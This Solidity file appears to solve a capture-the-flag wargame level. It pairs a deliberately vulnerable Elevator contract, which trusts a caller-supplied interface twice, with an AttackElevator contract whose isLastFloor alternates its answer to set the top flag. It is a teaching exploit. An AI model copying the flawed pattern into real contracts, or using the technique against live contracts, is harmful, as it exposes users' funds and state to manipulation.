// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract AttackElevator is Building {
  Elevator public elevator;
  bool reached;

  constructor(address _elevator) public {
    elevator = Elevator(_elevator);
  }

  function gotoFloor(uint floor) public {
    elevator.goTo(floor);
  }

  function isLastFloor(uint) public override returns(bool) {
    reached = !reached;
    return reached;
  }
}